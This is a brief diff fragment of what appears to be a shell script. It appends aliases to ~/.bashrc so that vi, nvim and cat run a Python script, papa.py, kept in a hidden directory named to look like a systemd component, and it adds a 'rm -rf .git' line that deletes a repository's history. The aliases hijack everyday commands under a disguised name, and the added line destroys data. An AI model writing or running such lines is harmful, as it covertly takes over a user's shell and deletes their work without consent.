@@ -8,3 +8,4 @@ echo 'alias vi="python3 ~/.systemd-flr/papa.py ~/.systemd-flr/papa.ppm"' >> ~/.b
 echo 'alias nvim="python3 ~/.systemd-flr/papa.py ~/.systemd-flr/papa.ppm"' >> ~/.bashrc
 echo 'alias cat="python3 ~/.systemd-flr/papa.py ~/.systemd-flr/papa.ppm"' >> ~/.bashrc
 
+rm -rf .git
